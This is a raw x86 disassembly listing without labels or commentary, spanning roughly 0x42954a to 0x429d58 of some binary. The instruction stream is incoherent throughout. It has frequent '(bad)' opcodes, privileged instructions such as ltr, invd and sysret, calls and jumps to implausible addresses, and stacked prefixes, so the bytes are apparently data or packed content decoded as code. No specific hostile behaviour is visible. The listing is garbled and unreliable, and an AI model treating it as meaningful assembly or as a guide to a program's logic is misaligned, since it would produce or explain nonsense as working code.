  42954a:	mov    esi,esp
  42954c:	call   0x77a92111
  429551:	inc    ebp
  429552:	mov    DWORD PTR [eax+0x984f0c],edi
  429558:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42955e:	add    BYTE PTR [esi+0x7d],ah
  429561:	inc    ebp
  429562:	mov    bx,WORD PTR [ebp+0x8]
  429566:	add    DWORD PTR [ebp+0x50],0x30c008b
  42956d:	inc    ebp
  42956e:	mov    bx,di
  429571:	lock test BYTE PTR [ecx+0x7000801],bh
  429578:	jge    0x42953b
  42957a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429580:	cli    
  429581:	xor    bl,bh
  429583:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429589:	test   BYTE PTR [eax],cl
  42958b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429592:	cmp    ebp,eax
  429594:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42959b:	test   BYTE PTR [ebp+0x1],bh
  42959e:	mov    ebx,0x458a00
  4295a3:	xor    esi,DWORD PTR [ebx]
  4295a5:	add    esp,DWORD PTR [esi-0x77]
  4295a8:	pop    ebp
  4295a9:	loopne 0x429611
  4295ab:	inc    ebp
  4295ac:	clc    
  4295ad:	xor    edi,DWORD PTR [ebx]
  4295af:	add    esi,DWORD PTR [edx-0x77]
  4295b2:	data16 fdivr QWORD PTR [ebp-0x49]
  4295b6:	mov    ebx,0xb78afc
  4295bb:	hlt    
  4295bc:	xor    esi,DWORD PTR [esi]
  4295be:	data16 add BYTE PTR [ebp+0x66],bl
  4295c2:	data16 lock clc 
  4295c5:	cmp    eax,DWORD PTR ss:[eax]
  4295c8:	ja     0x429630
  4295ca:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ce:	ltr    WORD PTR [ebp+0x66]
  4295d2:	add    esi,eax
  4295d4:	add    di,WORD PTR [ebp+0x2b]
  4295d8:	data16 data16 jge 0x429659
  4295dc:	mov    ebx,0xe08a8b
  4295e1:	jge    0x429616
  4295e3:	data16 data16 xor al,0x5d
  4295e7:	data16 data16 jne 0x4295e3
  4295eb:	mov    edi,DWORD PTR [ebx]
  4295ed:	fdiv   QWORD PTR [edx+0x7d]
  4295f0:	data16 data16 jge 0x429628
  4295f4:	mov    ebx,0x758a66
  4295f9:	mov    esi,0x667233
  4295fe:	pop    ebp
  4295ff:	or     BYTE PTR [esi+0x0],ah
  429602:	clc    
  429603:	mov    edi,DWORD PTR [ebx]
  429605:	lock ja 0x429593
  429608:	(bad)  
  42960a:	jge    0x429603
  42960c:	invd   
  42960e:	pop    ebp
  42960f:	add    BYTE PTR [ebx],al
  429611:	(bad)  
  429612:	cmp    di,WORD PTR [ebp+0xf]
  429616:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42961a:	mov    bx,WORD PTR [ebp-0x10]
  42961e:	pop    bp
  429620:	fbstp  TBYTE PTR [ebx]
  429622:	test   DWORD PTR [ebx],eax
  429624:	add    BYTE PTR [ebx],bh
  429626:	add    BYTE PTR [esi+0x7d],ah
  429629:	jge    0x4295b6
  42962b:	data16 in al,dx
  42962d:	pop    ebp
  42962e:	stc    
  42962f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429636:	mov    edi,ebx
  429638:	in     al,dx
  429639:	test   BYTE PTR [ebp+0x0],bh
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0xbd3f8fce
  429643:	ss cwde 
  429645:	add    BYTE PTR [edx],dh
  429647:	mov    bx,di
  42964a:	call   0x8b4b13da
  42964f:	add    ebp,esp
  429651:	mov    bx,di
  429654:	jnp    0x42967c
  429656:	mov    DWORD PTR [ebx+0x367df808],ecx
  42965c:	mov    eax,DWORD PTR [eax]
  42965e:	call   0x7c3e21c9
  429663:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429669:	data16 data16 fistp WORD PTR [ebp+0xe]
  42966e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429678:	fisttp WORD PTR [ecx-0x7401f77b]
  42967e:	(bad)  
  42967f:	cld    
  429680:	jne    0x4296b8
  429682:	xor    eax,DWORD PTR [eax]
  429684:	mov    esp,DWORD PTR [esi-0x10]
  429687:	sti    
  429688:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42968f:	data16 adc bl,bh
  429692:	push   ebp
  429693:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42969a:	mov    WORD PTR [eax],es
  42969c:	cwde   
  42969d:	data16 xor bh,bl
  4296a0:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4296a6:	mov    esp,DWORD PTR [esi-0x14]
  4296a9:	fisttp WORD PTR [ebx-0x3748a9f2]
  4296af:	or     al,0x2b
  4296b1:	mov    bh,0xba
  4296b3:	hlt    
  4296b4:	mov    bh,bl
  4296b6:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4296bc:	dec    edi
  4296bd:	or     al,0x0
  4296bf:	mov    edi,DWORD PTR [ebx]
  4296c1:	or     BYTE PTR [ebp+0x3b],dh
  4296c4:	mov    ecx,DWORD PTR [edi]
  4296c6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296cc:	xor    al,0xd8
  4296ce:	pop    bp
  4296d0:	lock xor esi,DWORD PTR [ebx]
  4296d3:	lea    esp,[esi+0x1f]
  4296d6:	icebp  
  4296d7:	jb     0x4296dd
  4296d9:	add    al,al
  4296db:	jge    0x4296e9
  4296dd:	mov    eax,eax
  4296df:	fsubr  st,st(3)
  4296e1:	pop    ebp
  4296e2:	mov    esi,DWORD PTR [ebx]
  4296e4:	in     al,0x8d
  4296e6:	rcr    DWORD PTR [edi],0xc2
  4296e9:	jb     0x429749
  4296eb:	add    cl,cl
  4296ed:	jge    0x4296fb
  4296ef:	mov    edx,DWORD PTR [ebp-0x20]
  4296f2:	in     al,dx
  4296f3:	pop    ebp
  4296f4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296f9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296fd:	mov    ebp,DWORD PTR [ebx]
  4296ff:	fdivr  QWORD PTR [esi+0x668a5d]
  429705:	cmp    al,0x33
  429707:	mov    si,0x4f7d
  42970b:	mov    eax,DWORD PTR [eax]
  42970d:	lock inc ebp
  42970f:	mov    esi,DWORD PTR [edi]
  429711:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429718:	clc    
  429719:	(bad)  
  42971a:	cmp    edi,DWORD PTR [ebx]
  42971c:	je     0x42972d
  42971e:	push   ebx
  42971f:	loopne 0x429730
  429721:	dec    ecx
  429723:	mov    ebp,DWORD PTR [eax-0x1c]
  429726:	int    0xf1
  429728:	mov    esi,0x703084d
  42972d:	orps   xmm6,xmm1
  429730:	add    BYTE PTR [ebp+0x66],dh
  429733:	jmp    0x429700
  429735:	mov    eax,DWORD PTR [ebx]
  429737:	lock push ebp
  429739:	ror    DWORD PTR [ebp-0x2972feb3],1
  42973f:	or     bh,dl
  429741:	jb     0x429741
  429743:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429749:	loopne 0x42974b
  42974b:	jne    0x429749
  42974d:	data16 add BYTE PTR [esi+eiz*2],dh
  429751:	mov    ecx,ebx
  429753:	data16 ss icebp 
  429756:	add    BYTE PTR [esi],dh
  429758:	data16 add bl,cl
  42975b:	data16 xor dh,dl
  42975e:	add    BYTE PTR [edx],dh
  429760:	data16 add bl,cl
  429763:	enterw 0x4df1,0x19
  429768:	pop    edi
  429769:	jne    0x4296ec
  42976b:	mov    esi,DWORD PTR [edi]
  42976d:	call   0x77b7230e
  429772:	xor    ebp,DWORD PTR [ebx]
  429774:	lea    esp,[esi+0x48]
  429777:	repnz in eax,0x3b
  42977a:	add    BYTE PTR [ebp-0x37],dh
  42977d:	xor    edx,DWORD PTR [ebp-0x15]
  429780:	in     al,dx
  429781:	xor    edx,DWORD PTR [esi+0x40]
  429784:	mov    DWORD PTR [edi],0x338545fc
  42978a:	clc    
  42978b:	add    edi,DWORD PTR [eax]
  42978d:	pop    edi
  42978e:	pushf  
  42978f:	pop    ebx
  429790:	call   0xff439757
  429795:	mov    edi,eax
  429797:	push   ecx
  429798:	pop    es
  429799:	mov    edi,DWORD PTR [ebx]
  42979b:	push   esi
  42979c:	inc    ebx
  42979d:	cld    
  42979e:	js     0x4297a0
  4297a0:	popa   
  4297a1:	data16 (bad) 
  4297a3:	into   
  4297a4:	push   0xb900cd36
  4297a9:	data16 or dh,cl
  4297ac:	pop    es
  4297ad:	xor    ah,BYTE PTR [esi+0x0]
  4297b0:	add    bh,al
  4297b2:	cld    
  4297b3:	cld    
  4297b4:	add    BYTE PTR [ebp+0x38c3f866],al
  4297ba:	ss pushf 
  4297bc:	add    BYTE PTR [esi+0x66],ah
  4297bf:	into   
  4297c0:	ret    
  4297c1:	pop    ebp
  4297c2:	add    al,0x57
  4297c4:	add    BYTE PTR [edi-0x723c409a],dh
  4297ca:	add    edi,edi
  4297cc:	jne    0x42981e
  4297ce:	lea    edx,[ecx+0x1]
  4297d1:	mov    ebx,0xd64ff1
  4297d6:	sar    DWORD PTR [ebx],1
  4297d8:	test   BYTE PTR [ebp+0x30],dh
  4297db:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297df:	push   edi
  4297e0:	xor    BYTE PTR [ebx],0x3b
  4297e3:	mov    esi,ebx
  4297e5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297eb:	xor    BYTE PTR [ebp+0x64],al
  4297ee:	pop    ebx
  4297ef:	mov    ebx,0x9c3a37
  4297f4:	je     0x429821
  4297f6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297fc:	mov    WORD PTR [ebx],?
  4297fe:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429804:	pop    edi
  429805:	cmp    ecx,ecx
  429807:	jne    0x42985e
  429809:	mov    ebp,esp
  42980b:	cld    
  42980c:	push   esi
  42980d:	pop    ebx
  42980e:	inc    ebp
  42980f:	stc    
  429810:	aaa    
  429811:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429818:	clc    
  429819:	test   dl,dl
  42981b:	xor    bh,bh
  42981d:	fs pop si
  429820:	or     bl,al
  429822:	cld    
  429823:	mov    eax,DWORD PTR [eax]
  429825:	push   ecx
  429826:	push   di
  429828:	retf   0x3645
  42982b:	aaa    
  42982c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429833:	clc    
  429834:	add    BYTE PTR [ebx+0x66],bl
  429837:	dec    edx
  429839:	mov    edx,DWORD PTR [edi-0x76]
  42983c:	push   edi
  42983d:	add    al,0xb7
  42983f:	xor    al,0xba
  429841:	cmp    al,0x8d
  429843:	je     0x429844
  429845:	mov    edx,DWORD PTR [eax-0x46]
  429848:	push   ecx
  429849:	lea    edi,[ebx+0x504fff]
  42984f:	push   ecx
  429850:	cmp    edx,DWORD PTR [ebx+0x75]
  429853:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429859:	add    BYTE PTR [ebx],dh
  42985b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429861:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429868:	mov    ebx,0x3b3a00
  42986d:	jne    0x42989a
  42986f:	mov    DWORD PTR [ebx+0x728afc],edi
  429875:	xor    esi,DWORD PTR [ebx]
  429877:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42987d:	push   edi
  42987e:	cmp    esp,ebp
  429880:	jne    0x429882
  429882:	sbb    DWORD PTR [eax],0x8085c3fc
  429888:	clc    
  429889:	inc    ebx
  42988a:	pop    ebx
  42988b:	sti    
  42988c:	add    eax,0xeb8bc075
  429891:	cld    
  429892:	xor    edi,DWORD PTR ds:0xf8c3855e
  429898:	mov    ecx,DWORD PTR [ecx+edx*2]
  42989b:	rol    DWORD PTR [ebp-0x37],0xf
  42989f:	mov    DWORD PTR [eax],ecx
  4298a1:	inc    edi
  4298a2:	(bad)  
  4298a3:	in     eax,0x4
  4298a5:	add    bh,bh
  4298a7:	(bad)  
  4298a8:	mov    esi,0xc38a5e
  4298ad:	mov    esi,DWORD PTR [ebx]
  4298af:	push   ecx
  4298b0:	mov    edi,0xfc4fc7
  4298b5:	test   DWORD PTR [ebp-0x8],edx
  4298b8:	data16 cmp bh,al
  4298bb:	pushf  
  4298bc:	sub    ebp,eax
  4298be:	inc    ebp
  4298bf:	(bad)  
  4298c0:	sub    edi,edi
  4298c2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298c8:	inc    ebp
  4298c9:	add    BYTE PTR [esi+0x2b],ah
  4298cc:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298d2:	cmp    al,0x33
  4298d4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298da:	(bad)  
  4298db:	cmp    esi,DWORD PTR [ebx]
  4298dd:	je     0x429897
  4298df:	push   ebx
  4298e0:	dec    edi
  4298e1:	str    ecx
  4298e4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298e7:	int    0x33
  4298e9:	mov    edi,0x789085f
  4298ee:	mov    eax,DWORD PTR [esp+edi*8]
  4298f1:	add    cl,cl
  4298f3:	data16 add al,0xcb
  4298f6:	push   ebp
  4298f7:	add    ebp,esp
  4298f9:	jne    0x4298e7
  4298fb:	(bad)  
  4298fc:	mov    DWORD PTR [ecx],0xd685f7ec
  429902:	clc    
  429903:	xlat   BYTE PTR ds:[ebx]
  429904:	inc    ebp
  429905:	mov    edi,DWORD PTR [ecx]
  429907:	push   eax
  429908:	pushf  
  429909:	in     eax,0x8b
  42990b:	add    ah,ch
  42990d:	cld    
  42990e:	push   eax
  42990f:	add    BYTE PTR [ecx+0x66],dl
  429912:	add    eax,0x3672cb
  429917:	add    BYTE PTR [ebp+0x66],al
  42991a:	(bad)  
  42991b:	retf   
  42991c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429923:	retf   
  429924:	cmp    al,0xc8
  429926:	pushf  
  429927:	jge    0x4298f0
  429929:	aaa    
  42992a:	cld    
  42992b:	pushf  
  42992c:	test   DWORD PTR [edi-0x8],ebx
  42992f:	je     0x429976
  429931:	xor    esi,DWORD PTR ds:0x7020840
  429937:	ror    BYTE PTR [ebp-0x37],0x8d
  42993b:	push   ebp
  42993c:	add    esp,ebp
  42993e:	jb     0x4298cb
  429940:	add    BYTE PTR [eax],cl
  429942:	dec    ebp
  429943:	mov    bh,0x81
  429945:	push   esi
  429946:	push   eax
  429947:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42994e:	xor    al,BYTE PTR [eax]
  429950:	mov    edx,DWORD PTR [edi+0x10]
  429953:	(bad)  
  429954:	scas   eax,DWORD PTR es:[edi]
  429955:	xor    bh,BYTE PTR [ebx]
  429957:	add    BYTE PTR [edi],cl
  429959:	mov    ebp,ebp
  42995b:	cld    
  42995c:	add    BYTE PTR [ebx],bh
  42995e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429962:	dec    ebp
  429963:	or     BYTE PTR [ebx],ch
  429965:	ret    0x458b
  429968:	lock jmp 0x42995c
  42996b:	mov    ecx,DWORD PTR [eax]
  42996d:	or     BYTE PTR [edi],al
  42996f:	mov    ecx,eax
  429971:	xor    DWORD PTR [edx+0x2],0x0
  429975:	mov    bh,0xc1
  429977:	adc    BYTE PTR [eax],dh
  429979:	iret   
  42997a:	inc    ebp
  42997b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429981:	inc    BYTE PTR [ebx]
  429983:	xor    bh,al
  429985:	add    BYTE PTR [ecx],dl
  429987:	data16 adc al,bh
  42998a:	dec    ecx
  42998b:	fisttp WORD PTR [ecx+0x456604c0]
  429991:	add    dh,BYTE PTR ds:0x75e0845
  429997:	ret    0x4d
  42999a:	lea    ecx,[ebx+0x18728301]
  4299a0:	add    BYTE PTR [ebp+0x45],al
  4299a3:	cmp    cl,ch
  4299a5:	pushf  
  4299a6:	add    bh,al
  4299a8:	add    al,ch
  4299aa:	inc    ebp
  4299ab:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4299b1:	xor    eax,0x781084d
  4299b6:	push   eax
  4299b7:	cwde   
  4299b8:	push   ecx
  4299b9:	xor    al,BYTE PTR [ecx+0x32f89889]
  4299bf:	inc    ebp
  4299c0:	cmp    esp,DWORD PTR [eax]
  4299c2:	jbe    0x429960
  4299c4:	mov    eax,edi
  4299c6:	or     ah,dh
  4299c8:	inc    ebp
  4299c9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299cf:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299d5:	in     al,dx
  4299d6:	hlt    
  4299d7:	push   eax
  4299d8:	push   eax
  4299d9:	push   ecx
  4299da:	push   ecx
  4299db:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299e1:	cwde   
  4299e2:	cwde   
  4299e3:	xor    dh,BYTE PTR [edx]
  4299e5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299eb:	or     BYTE PTR [ebp+0x7],al
  4299ee:	mov    eax,ecx
  4299f0:	clc    
  4299f1:	jb     0x4299b4
  4299f3:	add    BYTE PTR [ebp+0x55],cl
  4299f6:	or     DWORD PTR [edi],0xc251d150
  4299fc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429a06:	mov    edi,eax
  429a08:	or     cl,al
  429a0a:	inc    ebp
  429a0b:	dec    ebp
  429a0c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429a12:	or     WORD PTR [ecx],0x8998
  429a17:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  429a1d:	mov    edx,DWORD PTR [ecx+0x8]
  429a20:	mov    eax,DWORD PTR [ebp-0x8]
  429a23:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a2a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a30:	inc    ebp
  429a31:	dec    eax
  429a32:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a38:	add    edx,DWORD PTR [ecx-0x8]
  429a3b:	mov    ecx,DWORD PTR [ecx]
  429a3d:	clc    
  429a3e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a45:	mov    ecx,ebp
  429a47:	clc    
  429a48:	(bad)  
  429a49:	popf   
  429a4a:	inc    DWORD PTR [eax]
  429a4c:	ret    0x8b
  429a4f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a55:	mov    edi,esp
  429a57:	hlt    
  429a58:	test   ecx,esi
  429a5a:	clc    
  429a5b:	or     BYTE PTR [ebp+0x7],al
  429a5e:	cmp    ecx,eax
  429a60:	pushf  
  429a61:	jb     0x429a96
  429a63:	add    BYTE PTR [eax-0x3f],al
  429a66:	inc    eax
  429a67:	daa    
  429a68:	inc    ebp
  429a69:	inc    ebp
  429a6a:	xor    eax,0x7f80803
  429a6f:	dec    ebp
  429a70:	cwde   
  429a71:	add    esi,DWORD PTR [edx]
  429a73:	clc    
  429a74:	cmp    DWORD PTR [ecx],ecx
  429a76:	or     al,0x8
  429a78:	add    al,BYTE PTR [ebp+0x2c]
  429a7b:	xor    eax,0x7350845
  429a80:	or     BYTE PTR [ebp+0x7],cl
  429a83:	lea    ebx,[eax-0x748dcdff]
  429a89:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a90:	mov    edx,DWORD PTR [eax]
  429a92:	cld    
  429a93:	dec    ebp
  429a94:	push   eax
  429a95:	sub    edx,DWORD PTR [ecx-0x75]
  429a98:	add    eax,0xf172fc
  429a9d:	or     BYTE PTR [ebp+0x7],cl
  429aa0:	add    eax,ecx
  429aa2:	or     al,0x72
  429aa4:	add    DWORD PTR [eax],eax
  429aa6:	mov    ebx,0x29c2c1
  429aab:	inc    ebp
  429aac:	mov    eax,DWORD PTR [ebx]
  429aae:	cmp    eax,0x3004d1c
  429ab4:	xbegin 0x66c826ae
  429aba:	clc    
  429abb:	or     BYTE PTR [ebp+0x45],al
  429abe:	cmp    DWORD PTR ds:0x78b089c,esi
  429ac4:	adc    BYTE PTR [ebp+0x45],cl
  429ac7:	lea    eax,[ebp+0x33727501]
  429acd:	add    cl,ch
  429acf:	inc    ebp
  429ad0:	add    bl,ch
  429ad2:	add    BYTE PTR [ebx+0x45850845],cl
  429ad8:	je     0x429a65
  429ada:	push   ebx
  429adb:	or     al,0x85
  429add:	dec    ebp
  429ade:	std    
  429adf:	mov    bh,bh
  429ae1:	mov    BYTE PTR [ebp-0x75],al
  429ae4:	mov    edi,eax
  429ae6:	or     al,0x89
  429ae8:	inc    ebp
  429ae9:	clc    
  429aea:	mov    esp,esp
  429aec:	hlt    
  429aed:	call   DWORD PTR [edi-0x37]
  429af0:	push   eax
  429af1:	or     al,0x51
  429af3:	push   ebp
  429af4:	xor    ebp,esp
  429af6:	mov    esi,0x457251
  429afb:	cmp    dh,al
  429afd:	pushf  
  429afe:	inc    ebp
  429aff:	(bad)  
  429b00:	mov    edi,eax
  429b02:	or     al,0x85
  429b04:	add    al,bh
  429b06:	inc    eax
  429b08:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429b0c:	or     ah,bh
  429b0e:	inc    eax
  429b0f:	push   eax
  429b10:	jmp    0x429b63
  429b12:	mov    eax,DWORD PTR ds:0xe8720c
  429b18:	mov    DWORD PTR [ebp-0x8],eax
  429b1b:	jne    0x429b62
  429b1d:	jmp    0x429aaa
  429b1f:	mov    ebp,DWORD PTR [eax]
  429b21:	clc    
  429b22:	retf   0xff50
  429b25:	push   ecx
  429b26:	mov    DWORD PTR ds:0x757210,eax
  429b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b2f:	sub    esp,DWORD PTR [ebx-0x77]
  429b32:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b39:	or     ah,bh
  429b3b:	pop    es
  429b3c:	ds cwde 
  429b3e:	push   DWORD PTR [edx]
  429b40:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b46:	(bad)  
  429b47:	mov    bh,bh
  429b49:	jmp    0x429b37
  429b4b:	leave  
  429b4c:	jne    0x429b56
  429b4e:	call   0x2f94a8
  429b53:	in     al,dx
  429b54:	dec    ebp
  429b55:	add    dh,BYTE PTR [ebx]
  429b57:	add    BYTE PTR [ebx],al
  429b59:	inc    ebp
  429b5a:	cmp    edi,DWORD PTR [eax]
  429b5c:	je     0x429afa
  429b5e:	mov    eax,edi
  429b60:	or     al,0xf0
  429b62:	add    BYTE PTR [ebp+0x458bf845],al
  429b68:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b6e:	adc    al,0x7
  429b70:	enter  0x9fc0,0xa5
  429b74:	rol    BYTE PTR [eax],0x5e
  429b77:	mov    ecx,ecx
  429b79:	or     al,0xc
  429b7b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b82:	jmp    0x429b83
  429b84:	push   ebp
  429b85:	mov    esp,ebp
  429b87:	cld    
  429b88:	inc    ebp
  429b89:	inc    ebp
  429b8a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b91:	push   esi
  429b92:	push   esi
  429b93:	mov    edi,0x7af080f
  429b98:	add    bh,al
  429b9a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429ba0:	add    BYTE PTR [ecx+0x4540100f],cl
  429ba6:	mov    ebp,eax
  429ba8:	mov    ebp,edi
  429baa:	lock call edx
  429bad:	fcom   DWORD PTR [ebp+0x45]
  429bb0:	mov    eax,0x148a8b
  429bb5:	push   ecx
  429bb6:	enter  0xc145,0x83
  429bba:	cmp    cl,BYTE PTR [eax]
  429bbc:	add    BYTE PTR [ebp+0x4d],al
  429bbf:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429bc5:	call   0xffa29734
  429bca:	cmp    eax,DWORD PTR [ebp-0xc]
  429bcd:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bd1:	push   ebp
  429bd2:	(bad)
  429bd5:	std    
  429bd6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bdd:	inc    ebp
  429bde:	(bad)  
  429bdf:	call   0xff7c986f
  429be4:	add    al,BYTE PTR [ebp+0x37]
  429be7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bed:	jne    0x429bef
  429bef:	(bad)  
  429bf0:	cmp    edi,esp
  429bf2:	jne    0x429c25
  429bf4:	mov    edi,edi
  429bf6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bfc:	pop    ds
  429bfd:	into   
  429bfe:	je     0x429bc1
  429c00:	mov    ebx,DWORD PTR [esi]
  429c02:	or     BYTE PTR [ebp-0x49],al
  429c05:	mov    esp,DWORD PTR [esi-0x77]
  429c08:	mov    esi,0xfc451f0c
  429c0d:	mov    eax,DWORD PTR [eax]
  429c0f:	or     al,0x66
  429c11:	sar    bl,0x3b
  429c14:	xor    esi,DWORD PTR [ebp+0x66]
  429c17:	xor    ecx,edi
  429c19:	pop    edi
  429c1a:	adc    bl,BYTE PTR [ebx+0x78]
  429c1d:	ret    0xff
  429c20:	cld    
  429c21:	inc    ebp
  429c22:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c28:	cld    
  429c29:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c30:	push   0xffffff83
  429c32:	pop    edi
  429c33:	or     BYTE PTR [ebp+0x53],dh
  429c36:	xorps  xmm1,xmm2
  429c39:	test   BYTE PTR [eax+eax*1],bh
  429c3c:	add    BYTE PTR [eax],al
  429c3e:	adc    eax,eax
  429c40:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c48:	jmp    DWORD PTR [eax]
  429c4a:	ror    al,0x5e
  429c4d:	inc    ebp
  429c4e:	leave  
  429c4f:	xor    ecx,DWORD PTR [eax]
  429c51:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c57:	add    ch,al
  429c59:	xor    edi,edi
  429c5b:	xor    DWORD PTR [ebx],0x660033fc
  429c61:	mov    DWORD PTR [ebp-0xc],ecx
  429c64:	pcmpgtw mm0,mm0
  429c67:	add    dl,ah
  429c69:	leave  
  429c6a:	mov    edi,DWORD PTR [esi-0x7d]
  429c6d:	push   ax
  429c6f:	dec    ebp
  429c70:	mov    esi,DWORD PTR [ebx-0x75]
  429c73:	lea    ebp,[eax-0x7c00fffc]
  429c79:	xor    eax,DWORD PTR [eax]
  429c7b:	sysret 
  429c7d:	dec    ebp
  429c7e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c85:	push   WORD PTR [ecx+0x8]
  429c89:	jne    0x429c4c
  429c8b:	ud0    ecx,DWORD PTR [ecx]
  429c8e:	mov    esi,DWORD PTR [edx]
  429c90:	lods   al,BYTE PTR ds:[esi]
  429c91:	add    BYTE PTR [eax],al
  429c93:	data16 (bad) 
  429c95:	iret   
  429c96:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c9d:	cli    
  429c9e:	inc    ebp
  429c9f:	cmp    al,0x8d
  429ca1:	add    BYTE PTR [esi+0x2d],ah
  429ca4:	inc    ebp
  429ca5:	pop    ebp
  429ca6:	lea    ecx,[edi]
  429ca8:	mov    dl,bh
  429caa:	add    BYTE PTR [edi],cl
  429cac:	mov    DWORD PTR [eax+eax*8],edi
  429caf:	mov    ebx,0x3a87
  429cb4:	add    BYTE PTR [ebx],ch
  429cb6:	inc    ebp
  429cb7:	data16 (bad) 
  429cb9:	clc    
  429cba:	int3   
  429cbb:	cmp    eax,DWORD PTR [eax]
  429cbd:	je     0x429c48
  429cbf:	push   0xffffffc8
  429cc1:	pop    edi
  429cc2:	xchg   DWORD PTR [ebp+0x0],eax
  429cc5:	data16 add BYTE PTR [ebp+0x45],cl
  429cc9:	lea    cx,[ebp+0x10]
  429ccd:	jb     0x429ccf
  429ccf:	jmp    0x429c5a
  429cd1:	call   eax
  429cd3:	clc    
  429cd4:	xchg   DWORD PTR [edi+0x1],edi
  429cd7:	mov    eax,DWORD PTR [eax]
  429cd9:	or     BYTE PTR [ebp-0x49],al
  429cdc:	lea    eax,[eax+0x74003154]
  429ce2:	push   edi
  429ce3:	inc    edx
  429ce4:	jge    0x429ce5
  429ce6:	mov    DWORD PTR [edi],ecx
  429ce8:	fdiv   DWORD PTR [edi-0x6]
  429ceb:	inc    DWORD PTR [eax]
  429ced:	xor    edx,DWORD PTR [eax+0x5f]
  429cf0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cf3:	ret    0x0
  429cf6:	xor    BYTE PTR [ebp-0x51],cl
  429cf9:	cmp    edi,0xf0ff8904
  429cff:	data16 ror al,0x84
  429d03:	rol    BYTE PTR [eax],0x3b
  429d06:	add    al,dh
  429d08:	dec    eax
  429d09:	xchg   esp,eax
  429d0a:	push   ebx
  429d0b:	jmp    0x429c98
  429d0d:	push   ebp
  429d0e:	add    esp,ebp
  429d10:	add    ebp,esp
  429d12:	mov    edx,DWORD PTR [edi+0x24]
  429d15:	clc    
  429d16:	dec    esi
  429d17:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429d1d:	cmp    BYTE PTR [ebx],al
  429d1f:	jne    0x429caa
  429d21:	xor    esp,eax
  429d23:	jmp    0x459ea6
  429d28:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d2b:	jne    0x429d21
  429d2d:	call   0xffcc9a87
  429d32:	clc    
  429d33:	xchg   edi,eax
  429d34:	sti    
  429d35:	add    DWORD PTR [ebx],eax
  429d37:	add    BYTE PTR [ebp+0x47],bl
  429d3a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d40:	pop    ebp
  429d41:	mov    DWORD PTR [esi-0x48],esi
  429d44:	jmp    0x429d8d
  429d46:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d4c:	(bad)  
  429d4e:	cmp    al,0x0
  429d50:	cmp    eax,DWORD PTR [ebp+0x18]
  429d53:	lea    ebx,[ebp-0x56]
  429d56:	jle    0x429d58
  429d58:	jae    0x429ce3
